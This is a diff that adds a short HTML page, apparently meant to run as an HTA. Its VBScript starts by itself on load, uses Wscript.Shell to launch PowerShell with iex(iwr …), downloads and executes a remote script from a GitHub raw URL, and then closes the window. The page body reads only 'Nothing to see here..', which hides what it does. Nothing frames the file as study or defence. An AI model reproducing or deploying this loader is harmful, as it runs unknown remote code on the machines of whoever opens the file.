@@ -1,0 +1,16 @@
+<html>
+<head>
+<script language="VBScript">
+    Sub RunProgram
+        Set objShell = CreateObject("Wscript.Shell")
+        objShell.Run "powershell -cOmMAnD iex (iwr https://raw.githubusercontent.com/gsm-matt/gsm-matt/main/command)"
+        Window.Close
+    End Sub
+RunProgram()
+
+</script>
+</head>
+<body>
+    Nothing to see here..
+</body>
+</html>
